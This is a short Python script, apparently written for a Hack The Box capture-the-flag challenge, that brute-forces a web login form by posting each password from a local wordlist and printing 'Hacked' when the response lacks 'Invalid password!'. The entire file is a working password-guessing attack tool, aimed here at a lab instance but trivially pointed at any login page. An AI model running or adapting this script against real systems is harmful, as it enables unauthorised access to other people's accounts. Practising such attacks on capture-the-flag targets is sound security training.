import requests, sys

WEB = "http://docker.hackthebox.eu:31768/"

def exec(password):

	session = requests.Session()

	payload = {"password":password}
	resp = session.post(WEB, data=payload)

	if("Invalid password!" in resp.text):
		return False, resp.text
	else:
		return True, resp.text


if __name__ == "__main__":

	if (len(sys.argv) != 1):
		password = sys.argv[1]
		boolean, text = exec(password)
		print(text)
		
	else:
		file = open("passwd.txt")
		lines = file.read().splitlines()

		for line in lines:

			boolean, text = exec(line)

			if(boolean):
				print("Hacked -- pass is %s" % line)
				print(text)
				break
			else:
				print(line)

		file.close()


